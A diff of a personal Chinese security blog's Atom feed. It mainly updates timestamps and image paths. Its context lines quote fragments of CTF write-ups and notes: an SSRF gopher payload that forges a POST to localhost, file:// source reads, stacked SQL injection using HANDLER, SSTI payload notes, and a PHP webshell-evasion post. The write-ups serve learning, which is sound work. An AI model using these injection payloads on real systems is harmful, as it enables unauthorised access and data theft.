@@ -4,7 +4,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN">
     <title type="text">bu44er</title>
     <subtitle type="html">bu44er&#39;s blog</subtitle>
-    <updated>2024-11-14T14:52:21&#43;08:00</updated>
+    <updated>2024-11-14T15:06:41&#43;08:00</updated>
     <id>https://bu44er.top/</id>
     <link rel="alternate" type="text/html" href="https://bu44er.top/" />
     <link rel="self" type="application/atom&#43;xml" href="https://bu44er.top/atom.xml" />
@@ -78,7 +78,7 @@
 &lt;li&gt;font matter 中对应的 categories 反应了文章分类&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;可以利用 archetypes 原型模板来实现这一点：
-&lt;img src=&#34;../../../../img/Pasted%20image%2020240917013840.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;……</summary>
+&lt;img src=&#34;../../../../../img/Pasted%20image%2020240917013840.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;……</summary>
             
                 <content type="html">&lt;h2 id=&#34;配置&#34;&gt;配置&lt;/h2&gt;
 &lt;p&gt;配置文件：config.xoml&lt;/p&gt;
@@ -131,7 +131,7 @@
 &lt;li&gt;font matter 中对应的 categories 反应了文章分类&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;可以利用 archetypes 原型模板来实现这一点：
-&lt;img src=&#34;../../../../img/Pasted%20image%2020240917013840.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;../../../../../img/Pasted%20image%2020240917013840.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;当新建文件时，Hugo 会自动判断文章的原型模板，没找到对应的会使用 default。&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -153,9 +153,9 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;所以，content 中的文章内容是以最底层的分类为一个文件夹：
-&lt;img src=&#34;../../../../img/Pasted%20image%2020240917014514.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;../../../../../img/Pasted%20image%2020240917014514.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;但是，font matter中可以设置多个 categories，实现类似树状的分类（多层分类），虽然本地 content文件夹中内容的呈现较乱一些，没有多层，但是网页文章真正分类的逻辑上还是可以呈现树状，记得每次 hugo new 创建新文章使用原型模板时，要以最底层的分类为创建目录即可。
-&lt;img src=&#34;../../../../img/Pasted%20image%2020240917014725.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;../../../../../img/Pasted%20image%2020240917014725.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;另外，当创建 &lt;code&gt;cs/xxx.md&lt;/code&gt; 时，我设定的原型中的 categories 是 &lt;code&gt;categories = [&#39;CS&#39;, &#39;others&#39;]&lt;/code&gt; ，感觉这样的逻辑是很好的，保证不会有零散的文章直接出现在一级分类之下。所有属于一级分类且没有进一步对应二级分类的文章应该全部归档到相应一级分类的 others 这个类别之下。&lt;/li&gt;
 &lt;/ul&gt;
@@ -217,10 +217,10 @@
 &lt;h2 id=&#34;修改网站图标&#34;&gt;修改网站图标&lt;/h2&gt;
 &lt;p&gt;选一个图片，通过 &lt;a href=&#34;https://realfavicongenerator.net/&#34;&gt;Favicon Generator for perfect icons on all browsers&lt;/a&gt; 生成图标相关文件。&lt;/p&gt;
 &lt;p&gt;保留以下文件：
-&lt;img src=&#34;../../../../img/Pasted%20image%2020240916224159.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;../../../../../img/Pasted%20image%2020240916224159.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;将这些文件移动到 ~/blog/static/icons/目录下，再将 favicon.ico、site.webmanifest
 移动到 ~/blog/static/ 目录下。
-&lt;img src=&#34;../../../../img/Pasted%20image%2020240916224456.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;../../../../../img/Pasted%20image%2020240916224456.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;最后将 site.webmanifest 重命名为 manifest.json，并修改：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -455,7 +455,7 @@
             <title type="text">kali linux上suid失效</title>
             <link rel="alternate" type="text/html" href="https://bu44er.top/posts/sec/030785fb/" />
             <id>https://bu44er.top/posts/sec/030785fb/</id>
-            <updated>2024-11-14T00:56:09&#43;08:00</updated>
+            <updated>2024-11-14T15:06:26&#43;08:00</updated>
             <published>2024-11-11T11:50:27&#43;08:00</published>
             <author>
                     <name>bu44er</name>
@@ -463,11 +463,11 @@
                     <email>391900788@qq.com</email>
                     </author>
             <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">&lt;p&gt;经过 gpt 的指点，发现问题在于文件系统挂载设置了 nosuid：
-&lt;img src=&#34;../../img/Pasted%20image%2020241110234106.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;../../../img/Pasted%20image%2020241110234106.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;查看目标文件的文件系统挂载设置的命令：&lt;/p&gt;……</summary>
             
                 <content type="html">&lt;p&gt;经过 gpt 的指点，发现问题在于文件系统挂载设置了 nosuid：
-&lt;img src=&#34;../../img/Pasted%20image%2020241110234106.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;../../../img/Pasted%20image%2020241110234106.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;查看目标文件的文件系统挂载设置的命令：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -517,7 +517,7 @@
             <title type="text">在 macOS m1 上使用 UTM 安装 WinXP 解决文件传输问题</title>
             <link rel="alternate" type="text/html" href="https://bu44er.top/posts/cs/cv5a6cp9/" />
             <id>https://bu44er.top/posts/cs/cv5a6cp9/</id>
-            <updated>2024-11-14T14:51:44&#43;08:00</updated>
+            <updated>2024-11-14T15:06:26&#43;08:00</updated>
             <published>2024-10-14T22:25:31&#43;08:00</published>
             <author>
                     <name>bu44er</name>
@@ -526,23 +526,23 @@
                     </author>
             <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">&lt;h2 id=&#34;安装系统&#34;&gt;安装系统&lt;/h2&gt;
 &lt;p&gt;UTM 安装，选择模拟或者从 UTM 库中下载，xp 的 iso 要自己另外下载：
-&lt;img src=&#34;../../../../img/Pasted%20image%2020241014221729.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;../../../../../img/Pasted%20image%2020241014221729.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;文件传输&#34;&gt;文件传输&lt;/h2&gt;
 &lt;p&gt;用 spice tools / 网上邻居 / qq邮箱 都无效，最终被这个 meta 老哥启发了：&lt;/p&gt;……</summary>
             
                 <content type="html">&lt;h2 id=&#34;安装系统&#34;&gt;安装系统&lt;/h2&gt;
 &lt;p&gt;UTM 安装，选择模拟或者从 UTM 库中下载，xp 的 iso 要自己另外下载：
-&lt;img src=&#34;../../../../img/Pasted%20image%2020241014221729.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;../../../../../img/Pasted%20image%2020241014221729.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;文件传输&#34;&gt;文件传输&lt;/h2&gt;
 &lt;p&gt;用 spice tools / 网上邻居 / qq邮箱 都无效，最终被这个 meta 老哥启发了：&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;https://milen.me/writings/exploring-windows-xp-on-macos-arm64/&#34;&gt;milen.me — Exploring Windows XP on macOS ARM64&lt;/a&gt;
-&lt;img src=&#34;../../../../../../../../img/Pasted%20image%2020241014222157.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;img src=&#34;../../../../../../../../../img/Pasted%20image%2020241014222157.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;直接把软件打包成一个 iso，插入虚拟机当作磁盘就完事了。
-&lt;img src=&#34;../../../../img/Pasted%20image%2020241014222252.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;../../../../../img/Pasted%20image%2020241014222252.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;win.iso 是我打包的一些软件，打包操作在 macOS 上很方便，磁盘工具打包成 cdr 文件，再 &lt;code&gt;hdiutil makehybrid -iso -joliet -o win.iso win.cdr&lt;/code&gt; 转成 iso 文件&lt;/li&gt;
 &lt;/ul&gt;
@@ -582,7 +582,7 @@
             <title type="text">php一句话木马以及相关免杀</title>
             <link rel="alternate" type="text/html" href="https://bu44er.top/posts/sec/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E4%BB%A5%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%85%8D%E6%9D%80/" />
             <id>https://bu44er.top/posts/sec/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E4%BB%A5%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%85%8D%E6%9D%80/</id>
-            <updated>2024-11-14T01:00:30&#43;08:00</updated>
+            <updated>2024-11-14T15:06:26&#43;08:00</updated>
             <published>2024-10-13T15:27:04&#43;08:00</published>
             <author>
                     <name>bu44er</name>
@@ -732,7 +732,7 @@
 &lt;/ul&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;短标签&#34;&gt;短标签&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;../../../img/Pasted%20image%2020241013143113.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../../../../img/Pasted%20image%2020241013143113.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;short_open_tag 开启以后，可以使用 PHP 的短标签：&lt;code&gt;&amp;lt;? ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;绕过黑名单有 &lt;code&gt;php&lt;/code&gt;  的情况&lt;/li&gt;
@@ -773,7 +773,7 @@
             <title type="text">php代码审计</title>
             <link rel="alternate" type="text/html" href="https://bu44er.top/posts/sec/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" />
             <id>https://bu44er.top/posts/sec/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
-            <updated>2024-11-14T01:00:33&#43;08:00</updated>
+            <updated>2024-11-14T15:06:26&#43;08:00</updated>
             <published>2024-10-04T01:45:39&#43;08:00</published>
             <author>
                     <name>bu44er</name>
@@ -1529,7 +1529,7 @@ string(8) &amp;#34;\&amp;#39;\;ls\;&amp;#34;
 &lt;li&gt;ignore 参数需要 linux 环境&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;结果：
-&lt;img src=&#34;../../../../img/Pasted%20image%2020241008025618.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;../../../../../img/Pasted%20image%2020241008025618.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;code&gt;ls --ignore=&#39;zj&#39;\\&#39;&#39; -l \&#39; /tmp&lt;/code&gt; 可化简 &lt;code&gt;ls --ignore=zj\ -l &#39; /tmp&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
@@ -1674,7 +1674,7 @@ string(8) &amp;#34;\&amp;#39;\;ls\;&amp;#34;
             <title type="text">SSTI 漏洞</title>
             <link rel="alternate" type="text/html" href="https://bu44er.top/posts/sec/ssti%E6%BC%8F%E6%B4%9E/" />
             <id>https://bu44er.top/posts/sec/ssti%E6%BC%8F%E6%B4%9E/</id>
-            <updated>2024-11-14T01:00:27&#43;08:00</updated>
+            <updated>2024-11-14T15:06:26&#43;08:00</updated>
             <published>2024-09-21T19:17:14&#43;08:00</published>
             <author>
                     <name>bu44er</name>
@@ -1901,9 +1901,9 @@ string(8) &amp;#34;\&amp;#39;\;ls\;&amp;#34;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;文件结构：
-&lt;img src=&#34;../../../../img/Pasted%20image%2020240921192250.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;../../../../../img/Pasted%20image%2020240921192250.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;测试结果：
-&lt;img src=&#34;../../../../img/Pasted%20image%2020240921192254.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;../../../../../img/Pasted%20image%2020240921192254.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;python-魔术方法&#34;&gt;python 魔术方法&lt;/h2&gt;
 &lt;p&gt;在Python的SSTI中，大部分是依靠 ==基类-&amp;gt;子类-&amp;gt;危险函数== 的方式来利用SSTI&lt;/p&gt;
@@ -1942,7 +1942,7 @@ string(8) &amp;#34;\&amp;#39;\;ls\;&amp;#34;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;h4 id=&#34;实例&#34;&gt;实例&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&#34;../../../../img/Pasted%20image%2020240924101851.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../../../../../img/Pasted%20image%2020240924101851.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -2004,9 +2004,9 @@ string(8) &amp;#34;\&amp;#39;\;ls\;&amp;#34;
 &lt;li&gt;直接 python3 运行这个文件即可&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;正常使用：
-&lt;img src=&#34;../../../../img/Pasted%20image%2020240921194704.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;../../../../../img/Pasted%20image%2020240921194704.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;==注入==：
-&lt;img src=&#34;../../../../img/Pasted%20image%2020240921194643.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;../../../../../img/Pasted%20image%2020240921194643.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;修改代码以避免直接的 XSS 注入：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2032,7 +2032,7 @@ string(8) &amp;#34;\&amp;#39;\;ls\;&amp;#34;
 &lt;/ul&gt;
 &lt;p&gt;&lt;code&gt;{{}}&lt;/code&gt;并不仅仅可以传递变量，还可以执行一些简单的表达式。&lt;/p&gt;
 &lt;p&gt;以上一个 part 的 ssti.py 代码为例，注入 &lt;code&gt;id={{2*4}}&lt;/code&gt;  :
-&lt;img src=&#34;../../../../img/Pasted%20image%2020240924100108.png&#34; alt=&#34;&#34;&gt;
+&lt;img src=&#34;../../../../../img/Pasted%20image%2020240924100108.png&#34; alt=&#34;&#34;&gt;
 &lt;code&gt; 一般思路：找到父类&lt;/code&gt;&amp;lt;type &#39;object&#39;&amp;gt;`--&amp;gt;寻找子类--&amp;gt;找关于命令执行或者文件操作的模块&lt;/p&gt;
 &lt;h3 id=&#34;手工-payload&#34;&gt;手工 payload&lt;/h3&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -2224,7 +2224,7 @@ class=__class__&amp;amp;mro=__mro__&amp;amp;subclasses=__subclasses__
             <title type="text">beef xss</title>
             <link rel="alternate" type="text/html" href="https://bu44er.top/posts/sec/beef-xss/" />
             <id>https://bu44er.top/posts/sec/beef-xss/</id>
-            <updated>2024-11-14T00:54:03&#43;08:00</updated>
+            <updated>2024-11-14T15:06:26&#43;08:00</updated>
             <published>2024-09-17T23:47:23&#43;08:00</published>
             <author>
                     <name>bu44er</name>
@@ -2292,7 +2292,7 @@ class=__class__&amp;amp;mro=__mro__&amp;amp;subclasses=__subclasses__
 &lt;hr&gt;
 &lt;h2 id=&#34;beef-抓不到本地访问记录&#34;&gt;beef 抓不到本地访问记录&lt;/h2&gt;
 &lt;p&gt;==要直连，不能用代理！！！==&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../../../../img/Pasted%20image%2020240917234606.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../../../../../img/Pasted%20image%2020240917234606.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;为什么不能用代理？&lt;/p&gt;
 &lt;p&gt;gpt：代理服务器本身不在我的内网中，无法解析和访问内部地址&lt;/p&gt;
@@ -2333,7 +2333,7 @@ class=__class__&amp;amp;mro=__mro__&amp;amp;subclasses=__subclasses__
             <title type="text">CTFHUB---SSRF-POST请求</title>
             <link rel="alternate" type="text/html" href="https://bu44er.top/posts/sec/wp/ctfhub---ssrf-post%E8%AF%B7%E6%B1%82/" />
             <id>https://bu44er.top/posts/sec/wp/ctfhub---ssrf-post%E8%AF%B7%E6%B1%82/</id>
-            <updated>2024-11-14T01:00:23&#43;08:00</updated>
+            <updated>2024-11-14T15:06:26&#43;08:00</updated>
             <published>2024-09-17T23:43:11&#43;08:00</published>
             <author>
                     <name>bu44er</name>
@@ -2363,13 +2363,13 @@ class=__class__&amp;amp;mro=__mro__&amp;amp;subclasses=__subclasses__
 &lt;p&gt;尝试访问 index.php 页面，发现还是跳转到 /?url=_ 页面，抓包发现是一个 302 跳转。&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;初步判断存在 ssrf 漏洞
-&lt;img src=&#34;../../../../img/Pasted%20image%2020240917221922.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;img src=&#34;../../../../../img/Pasted%20image%2020240917221922.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h3 id=&#34;file-读取源码&#34;&gt;file:// 读取源码&lt;/h3&gt;
 &lt;p&gt;尝试访问&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?url=localhost/flag.php
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;发现有输入框：
-&lt;img src=&#34;../../../../img/Pasted%20image%2020240917222533.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;../../../../../img/Pasted%20image%2020240917222533.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;尝试读取 index.php 和 flag.php 的源码：&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?url=file:///var/www/html/index.php
 ?url=file:///var/www/html/flag.php
@@ -2451,7 +2451,7 @@ class=__class__&amp;amp;mro=__mro__&amp;amp;subclasses=__subclasses__
 &lt;/ul&gt;
 &lt;h3 id=&#34;gopher-协议发送-post&#34;&gt;gopher 协议发送 POST&lt;/h3&gt;
 &lt;p&gt;正常情况应该直接发送一个 POST 就出 flag，发了试了一下果然不行：
-&lt;img src=&#34;../../../../img/Pasted%20image%2020240917230306.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;../../../../../img/Pasted%20image%2020240917230306.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;可能的解释是直接发送 POST 无法访问内网，没有权限，这也是 ssrf 的优势，就是要利用服务端伪造请求，权限一般高于客户端的请求，可以访问内网，这题指明是 ssrf，所以用 gopher 协议发送 POST&lt;/li&gt;
 &lt;/ul&gt;
@@ -2531,7 +2531,7 @@ key=51457bb0a50c1eb2c92dcc3ec3c2cc13
 &lt;/div&gt;&lt;p&gt;payload：&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?url=gopher%3A//127.0.0.1%3A80/_%250D%250APOST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey%253Dd40e836124bc67ddd5a567ec1ad22176%250D%250A
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;flag：
-&lt;img src=&#34;../../../../img/Pasted%20image%2020240917233050.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;../../../../../img/Pasted%20image%2020240917233050.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 </content>
             
             
@@ -2576,7 +2576,7 @@ key=51457bb0a50c1eb2c92dcc3ec3c2cc13
             <title type="text">GYCTF2020---Blacklist</title>
             <link rel="alternate" type="text/html" href="https://bu44er.top/posts/sec/wp/gyctf2020---blacklist/" />
             <id>https://bu44er.top/posts/sec/wp/gyctf2020---blacklist/</id>
-            <updated>2024-11-14T01:00:16&#43;08:00</updated>
+            <updated>2024-11-14T15:06:26&#43;08:00</updated>
             <published>2024-09-17T02:07:55&#43;08:00</published>
             <author>
                     <name>bu44er</name>
@@ -2585,7 +2585,7 @@ key=51457bb0a50c1eb2c92dcc3ec3c2cc13
                     </author>
             <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">&lt;h2 id=&#34;题目&#34;&gt;题目&lt;/h2&gt;
 &lt;p&gt;一个输入：
-&lt;img src=&#34;../../../../img/Pasted%20image%2020240917020558.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;../../../../../img/Pasted%20image%2020240917020558.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;分析&#34;&gt;分析&lt;/h2&gt;
 &lt;h3 id=&#34;看看数据库和表&#34;&gt;看看数据库和表&lt;/h3&gt;
@@ -2593,14 +2593,14 @@ key=51457bb0a50c1eb2c92dcc3ec3c2cc13
 &lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
 &lt;li&gt;注意加分号&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;../../../../img/Pasted%20image%2020240917020645.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../../../../img/Pasted%20image%2020240917020652.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../../../../../img/Pasted%20image%2020240917020645.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../../../../../img/Pasted%20image%2020240917020652.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h3 id=&#34;handler--open&#34;&gt;HANDLER ... OPEN&lt;/h3&gt;
 &lt;p&gt;新姿势：&lt;code&gt;HANDLER ... OPEN&lt;/code&gt;语句打开一个表，使其可以使用后续&lt;code&gt;HANDLER ... READ&lt;/code&gt;语句访问，该表对象未被其他会话共享，并且在会话调用&lt;code&gt;HANDLER ... CLOSE&lt;/code&gt;或会话终止之前不会关闭&lt;/p&gt;……</summary>
             
                 <content type="html">&lt;h2 id=&#34;题目&#34;&gt;题目&lt;/h2&gt;
 &lt;p&gt;一个输入：
-&lt;img src=&#34;../../../../img/Pasted%20image%2020240917020558.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;../../../../../img/Pasted%20image%2020240917020558.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;分析&#34;&gt;分析&lt;/h2&gt;
 &lt;h3 id=&#34;看看数据库和表&#34;&gt;看看数据库和表&lt;/h3&gt;
@@ -2608,8 +2608,8 @@ key=51457bb0a50c1eb2c92dcc3ec3c2cc13
 &lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
 &lt;li&gt;注意加分号&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;../../../../img/Pasted%20image%2020240917020645.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../../../../img/Pasted%20image%2020240917020652.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../../../../../img/Pasted%20image%2020240917020645.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../../../../../img/Pasted%20image%2020240917020652.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h3 id=&#34;handler--open&#34;&gt;HANDLER ... OPEN&lt;/h3&gt;
 &lt;p&gt;新姿势：&lt;code&gt;HANDLER ... OPEN&lt;/code&gt;语句打开一个表，使其可以使用后续&lt;code&gt;HANDLER ... READ&lt;/code&gt;语句访问，该表对象未被其他会话共享，并且在会话调用&lt;code&gt;HANDLER ... CLOSE&lt;/code&gt;或会话终止之前不会关闭&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39;;
@@ -2663,7 +2663,7 @@ HANDLER FlagHere CLOSE;#
             <title type="text">fakebook</title>
             <link rel="alternate" type="text/html" href="https://bu44er.top/posts/sec/wp/fakebook/" />
             <id>https://bu44er.top/posts/sec/wp/fakebook/</id>
-            <updated>2024-11-14T01:00:08&#43;08:00</updated>
+            <updated>2024-11-14T15:06:26&#43;08:00</updated>
             <published>2024-09-16T18:03:22&#43;08:00</published>
             <author>
                     <name>bu44er</name>
@@ -2671,12 +2671,12 @@ HANDLER FlagHere CLOSE;#
                     <email>391900788@qq.com</email>
                     </author>
             <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">&lt;h2 id=&#34;题目&#34;&gt;题目&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;../../../../img/Pasted%20image%2020240916180603.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../../../../../img/Pasted%20image%2020240916180603.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;分析&#34;&gt;分析&lt;/h2&gt;
 &lt;h3 id=&#34;join页面提交blog-url&#34;&gt;join页面提交blog （URL）&lt;/h3&gt;
 &lt;p&gt;点进 join页面，发现是一个提交 blog的框&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../../../../img/Pasted%20image%2020240916180708.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../../../../../img/Pasted%20image%2020240916180708.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;对 blog 试了一些数字都提示 Blog is not valid.&lt;/li&gt;
 &lt;/ul&gt;
@@ -2684,12 +2684,12 @@ HANDLER FlagHere CLOSE;#
 &lt;p&gt;用 dirmap 扫网站发现有 user.php.bak 文件&lt;/p&gt;……</summary>
             
                 <content type="html">&lt;h2 id=&#34;题目&#34;&gt;题目&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;../../../../img/Pasted%20image%2020240916180603.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../../../../../img/Pasted%20image%2020240916180603.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;分析&#34;&gt;分析&lt;/h2&gt;
 &lt;h3 id=&#34;join页面提交blog-url&#34;&gt;join页面提交blog （URL）&lt;/h3&gt;
 &lt;p&gt;点进 join页面，发现是一个提交 blog的框&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../../../../img/Pasted%20image%2020240916180708.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../../../../../img/Pasted%20image%2020240916180708.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;对 blog 试了一些数字都提示 Blog is not valid.&lt;/li&gt;
